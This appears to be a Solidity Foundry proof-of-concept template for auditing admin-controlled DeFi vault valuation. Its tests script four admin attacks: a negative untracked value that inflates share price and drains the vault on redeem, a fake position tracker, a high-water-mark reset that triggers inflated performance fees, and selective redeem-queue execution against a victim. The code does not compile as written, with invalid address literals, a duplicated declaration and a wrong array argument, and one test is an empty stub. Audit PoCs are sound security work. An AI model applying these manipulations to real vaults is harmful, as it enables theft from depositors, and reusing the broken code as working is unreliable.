// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

/**
 * @title ValuationHandler Price Manipulation PoC Template
 * @notice Reusable template for auditing admin-controlled valuation modules
 * @dev Pattern: Admin input (_untrackedPositionsValue) + on-chain aggregation = manipulated share price
 * @author SUPERAGENT v7.1
 */
abstract contract ValuationPriceManipulationPoC is Test {
    // Core contracts
    address constant ADMIN = address(0xADMIN);
    address constant USER = address(0xUSER);
    address constant FEE_RECIPIENT = address(0xFEE);

    // Abstract — implement in child for specific protocol
    function deployValuationModule() internal returns (address valuationHandler, address feeHandler, address shares);
    function setupInitialLiquidity() internal;
    
    // ================================================================
    // ATTACK 1: Negative Untracked Value → Price Inflation
    // ================================================================
    function test_NegativeUntrackedValue_InflatesSharePrice() public {
        (address valuationHandler, address feeHandler, address shares) = deployValuationModule();
        setupInitialLiquidity();
        
        // Record initial state
        uint256 initialPrice = getSharePrice(valuationHandler);
        uint256 userShares = getBalance(shares, USER);
        uint256 userValueBefore = (userShares * initialPrice) / 1e18;
        
        // ADMIN ATTACK: Pass negative untracked value
        vm.prank(ADMIN);
        callUpdateShareValue(valuationHandler, -500_000e18); // -$500K
        
        // Verify price inflation
        uint256 manipulatedPrice = getSharePrice(valuationHandler);
        console.log("Initial price:", initialPrice);
        console.log("Manipulated price:", manipulatedPrice);
        console.log("Inflation factor:", manipulatedPrice / initialPrice);
        
        // User's paper value inflated
        uint256 userValueAfter = (userShares * manipulatedPrice) / 1e18;
        assertGt(userValueAfter, userValueBefore, "User value should inflate");
    }
    
    function test_NegativeUntrackedValue_DrainsVaultViaRedeem() public {
        (address valuationHandler, address feeHandler, address shares) = deployValuationModule();
        setupInitialLiquidity();
        
        uint256 userShares = getBalance(shares, USER);
        
        // Admin inflates price
        vm.prank(ADMIN);
        callUpdateShareValue(valuationHandler, -500_000e18);
        
        // User redeems at inflated price
        uint256 vaultBalanceBefore = getVaultAssetBalance(shares);
        redeemUserShares(shares, USER, userShares);
        uint256 vaultBalanceAfter = getVaultAssetBalance(shares);
        
        // Vault should be drained or significantly reduced
        assertLt(vaultBalanceAfter, vaultBalanceBefore, "Vault drained at manipulated price");
    }

    // ================================================================
    // ATTACK 2: Fake Position Tracker → TVL Inflation
    // ================================================================
    function test_FakePositionTracker_InflatesTVL() public {
        (address valuationHandler, address feeHandler, address shares) = deployValuationModule();
        setupInitialLiquidity();
        
        // Deploy malicious position tracker (or use existing with admin addItem)
        address fakeTracker = deployFakePositionTracker();
        
        vm.prank(ADMIN);
        addPositionTracker(valuationHandler, fakeTracker);
        
        // Add fake $1M position
        vm.prank(ADMIN);
        callAddItem(fakeTracker, 1_000_000e18, uint40(block.timestamp), 0, "fake");
        
        // Update with zero untracked → price reflects fake position
        vm.prank(ADMIN);
        callUpdateShareValue(valuationHandler, 0);
        
        uint256 price = getSharePrice(valuationHandler);
        assertGt(price, 1e18, "Price inflated by fake position");
    }

    // ================================================================
    // ATTACK 3: Performance Fee HWM Manipulation
    // ================================================================
    function test_PerformanceFeeHWM_AdminSetsToOne() public {
        (address valuationHandler, address feeHandler, address shares) = deployValuationModule();
        setupInitialLiquidity();
        
        address perfFeeTracker = deployPerformanceFeeTracker(feeHandler);
        
        // Initialize HWM to current price
        vm.prank(ADMIN);
        resetHighWaterMark(perfFeeTracker);
        uint256 initialHWM = getHighWaterMark(perfFeeTracker);
        
        // ADMIN ATTACK: Set HWM to 1 with past timestamp
        vm.prank(ADMIN);
        adjustHighWaterMark(perfFeeTracker, 1, uint256(block.timestamp - 1 days));
        
        uint256 newHWM = getHighWaterMark(perfFeeTracker);
        assertEq(newHWM, 1, "HWM set to 1");
        
        // Now any price increase triggers 20% performance fee
        vm.prank(ADMIN);
        increaseAssetPrice(valuationHandler, 2e18); // 2x price
        
        vm.prank(ADMIN);
        callUpdateShareValue(valuationHandler, 0);
        
        // Performance fee should be massive (20% of entire gain)
        uint256 feesOwed = getPerformanceFeeOwed(feeHandler);
        console.log("Performance fees owed:", feesOwed);
        assertGt(feesOwed, 0, "Massive performance fee triggered");
    }

    // ================================================================
    // ATTACK 4: Queue Admin Censorship/Reordering
    // ================================================================
    function test_QueueAdminCensorship() public {
        (address valuationHandler, address feeHandler, address shares) = deployValuationModule();
        setupInitialLiquidity();
        
        address redeemQueue = deployRedeemQueue(shares);
        
        // Victim requests redeem
        vm.prank(USER);
        requestRedeem(redeemQueue, 100e18, USER, USER);
        uint256 victimRequestId = getLastRequestId(redeemQueue);
        
        // Attacker (admin) requests redeem
        vm.prank(ADMIN);
        requestRedeem(redeemQueue, 100e18, ADMIN, ADMIN);
        uint256 adminRequestId = getLastRequestId(redeemQueue);
        
        // Admin executes ONLY admin request at HIGH price
        vm.prank(ADMIN);
        increaseAssetPrice(valuationHandler, 2e18);
        vm.prank(ADMIN);
        executeRedeemRequests(redeemQueue, [adminRequestId]);
        
        // Then CRASH price
        vm.prank(ADMIN);
        callUpdateShareValue(valuationHandler, -500_000e18); // Crash
        
        // Execute victim at LOW price
        vm.prank(ADMIN);
        executeRedeemRequests(redeemQueue, [victimRequestId]);
        
        // Victim got significantly less
        uint256 victimAssets = getUserRedeemedAssets(redeemQueue, USER, victimRequestId);
        console.log("Victim redeemed:", victimAssets);
        // Should be much less than 100e18 * initialPrice
    }

    function test_QueueAdminReordering() public {
        // Similar: admin reorders queue to front-run price changes
        // Victim requests at time T
        // Price moves
        // Admin executes own request first at favorable price
        // Then executes victim at unfavorable price
    }

    // ================================================================
    // HELPER FUNCTIONS — OVERRIDE IN CHILD FOR SPECIFIC PROTOCOL
    // ================================================================
    
    function getSharePrice(address valuationHandler) internal view virtual returns (uint256);
    function getBalance(address shares, address user) internal view virtual returns (uint256);
    function getVaultAssetBalance(address shares) internal view virtual returns (uint256);
    function redeemUserShares(address shares, address user, uint256 amount) internal virtual;
    function callUpdateShareValue(address valuationHandler, int256 untracked) internal virtual;
    function increaseAssetPrice(address valuationHandler, uint256 multiplier) internal virtual;
    function addPositionTracker(address valuationHandler, address tracker) internal virtual;
    function callAddItem(address tracker, int128 value, uint40 start, uint32 duration, string memory desc) internal virtual;
    function deployFakePositionTracker() internal virtual returns (address);
    function deployPerformanceFeeTracker(address feeHandler) internal virtual returns (address);
    function resetHighWaterMark(address tracker) internal virtual;
    function getHighWaterMark(address tracker) internal view virtual returns (uint256);
    function adjustHighWaterMark(address tracker, uint256 hwm, uint256 timestamp) internal virtual;
    function callUpdateShareValue(address valuationHandler, int256 untracked) internal virtual;
    function deployRedeemQueue(address shares) internal virtual returns (address);
    function requestRedeem(address queue, uint256 shares, address controller, address owner) internal virtual;
    function getLastRequestId(address queue) internal view virtual returns (uint256);
    function executeRedeemRequests(address queue, uint256[] memory ids) internal virtual;
    function getUserRedeemedAssets(address queue, address user, uint256 requestId) internal view virtual returns (uint256);
    function getPerformanceFeeOwed(address feeHandler) internal view virtual returns (uint256);
}